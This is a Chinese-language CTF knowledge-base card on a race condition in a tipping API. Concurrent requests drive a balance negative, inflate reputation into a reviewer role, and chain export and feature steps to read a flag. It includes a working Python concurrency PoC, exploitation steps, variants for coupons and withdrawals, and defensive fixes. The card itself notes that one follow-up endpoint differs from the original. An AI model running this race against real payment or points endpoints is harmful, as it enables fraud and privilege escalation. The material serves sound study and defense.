---
id: web-generic-race-condition-tip-reputation-role-escalation
title: 打赏接口并发竞态：负余额刷声望→reviewer→导出 token→featured 读公告 flag
type: scenario
domain: web
path: web/generic/race-condition
technique: tip-race-reputation-role-escalation
tags:
- race-condition
- business-logic
- balance
- reputation
- role-escalation
- concurrent
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V111
  verified_at: '2026-11-06T01:45:54+08:00'
  notes: 已对照 InkVerse 原文与图片核对：/api/tip 并发后余额 -80、声望 56、reviewer 角色、review/export/status、Feature-Token、featured 公告拿 flag 均与原文一致。卡片“后续”用 /api/review/single，原文实际成功的是 /api/review/batch（single 返回 Article is not pending review），属小瑕疵不影响链；PoC 未本机执行
url: /docs/web/generic/race-condition/web-generic-race-condition-tip-reputation-role-escalation/
draft: false
kb_aliases:
- InkVerse
- 并发打赏
- 余额竞态
- 声望提升 reviewer
- 负余额刷声望
- 竞态提权
---

## 一句话结论

`/api/tip` 先读余额、判断充足、再分别扣款与加声望，检查和更新不是原子操作；用 40 个并发请求同时打赏，所有请求都通过余额检查，余额被扣成负数而声望按请求次数累加，超过阈值后角色自动升为 `reviewer`，随后可审批文章、导出带 `Feature-Token` 的文件、把文章设为 featured，最终在作者公告栏读取 flag。

## 原理

- 非原子“检查-更新”是典型 TOCTOU/竞态：服务端逻辑约为 `balance = get(); if (balance >= amount) { set(balance - amount); reputation += 1; }`，读与写之间没有锁/事务。
- 并发请求在同一时间都读到旧余额（如 200），都判断 `200 >= 10` 成立，然后各自扣款/加声望；数据库最终余额可能变成负数，但每个请求都成功。
- 声望按成功请求次数累加，达到 `>=50` 后服务端把角色从 `user` 提升为 `reviewer`（案例 40 并发后声望 56、余额 -80）。
- reviewer 可以访问 `/review`，批量/单篇审批文章；审批通过后可调用 `/api/export` 生成导出文件，文件包含 `Feature-Token: <64 hex>`。
- 用该 token 调用 `/api/review/feature` 把文章设为 featured；作者账号访问 `/bulletin` 或刷新缓存即可看到仅 featured 作者可见的 flag。
- 这个链的核心不是单点漏洞，而是“余额/声望/角色”三个状态在并发下不一致，导致低权限用户获得 reviewer 权限，再借导出/feature 流程读取敏感公告。

## 触发条件

- 打赏/积分/余额接口使用“读-判断-写”分离逻辑，无数据库事务、行锁或原子更新。
- 余额检查和扣款之间有时间窗口，且服务端不校验余额不能为负。
- 声望/角色根据累计成功次数自动提升，阈值可被并发请求快速达到。
- reviewer 角色拥有审批、导出、feature 等后续权限，且导出文件包含可用于 feature 的 token。

## 利用步骤

1. 注册普通账号，记录初始余额/声望/角色。
2. 用多线程/异步并发对同一文章调用 `/api/tip`（案例 40 并发），确保请求同时发出（可用 HTTP/2 单包或线程池）。
3. 登录该账号查看 dashboard，确认余额变负、声望超过 reviewer 阈值、角色变为 `reviewer`。
4. 以 reviewer 身份访问 `/review`，审批目标文章（或自己用另一账号创建的文章）。
5. 调用 `/api/export` 导出该文章，轮询 `/api/export/status` 获取 `output_path`，访问 `/exports/<file>` 读取 `Feature-Token`。
6. 调用 `/api/review/feature` 提交 `article_id` + `signature=Feature-Token`，把文章设为 featured。
7. 用文章作者账号登录，访问 `/bulletin` 并刷新缓存，读取 flag。

## PoC

```python
import concurrent.futures
import requests

BASE = "http://target"
s = requests.Session()
s.post(f"{BASE}/register", data={"username": "test12345", "password": "Passw0rd!"})
s.post(f"{BASE}/login", data={"username": "test12345", "password": "Passw0rd!"})
cookie = s.cookies.get("session")

def tip_once(_):
    r = requests.post(f"{BASE}/api/tip", json={"article_id": 1},
                      headers={"Cookie": f"session={cookie}"}, timeout=15)
    return r.status_code, r.text

with concurrent.futures.ThreadPoolExecutor(max_workers=40) as pool:
    results = [f.result() for f in concurrent.futures.as_completed(
        [pool.submit(tip_once, i) for i in range(40)])]

print("success =", sum(1 for status, _ in results if status == 200))
print(s.get(f"{BASE}/dashboard").text)   # 余额 -80，声望 56，role reviewer
```

后续：`POST /api/review/single {"article_id":16,"action":"approve"}` → `POST /api/export {"article_id":16}` → 轮询 `/api/export/status` → `GET /exports/export_10_16.txt` 取 `Feature-Token` → `POST /api/review/feature {"article_id":16,"signature":token}` → 作者账号 `/bulletin` 读 flag。

## 变体与关联

- 变体：优惠券/积分/提现/投票等“检查-扣减-累加”接口同样可并发；用 HTTP/2 单连接多路复用或大量线程提高命中率。
- 变体：若服务端用 `UPDATE balance = balance - ? WHERE balance >= ?` 原子更新，则需找其他非原子字段（声望、计数、库存）。
- 变体：角色提升阈值/条件可能由前端或配置决定，先确认 reviewer 判定逻辑。
- 关联：[[web-generic-payment-amount-tamper-no-order-binding]]（支付金额/订单绑定）、[[web-generic-payment-rounding-differential-recharge]]（金额舍入差异）、[[web-generic-client-side-score-trust]]（客户端上报信任）。

## 检测与防御

- 防御：余额/声望更新使用数据库事务 + 行锁（`SELECT ... FOR UPDATE`）或原子 SQL（`UPDATE ... SET balance=balance-? WHERE balance>=?`），检查影响行数。
- 防御：对打赏/积分接口做幂等键、速率限制、单用户并发限制；禁止余额为负。
- 防御：角色提升应由可信业务事件驱动，不能仅靠可被并发刷的计数；关键操作加二次校验/审计。
- 检测：同一用户短时间大量相同请求、余额/声望异常跳变、负余额、reviewer 角色突增；导出/feature 调用序列异常。
- 响应：回滚异常余额/声望与角色，封禁来源账号/IP，审计导出 token 与 featured 文章，修复事务与限流。
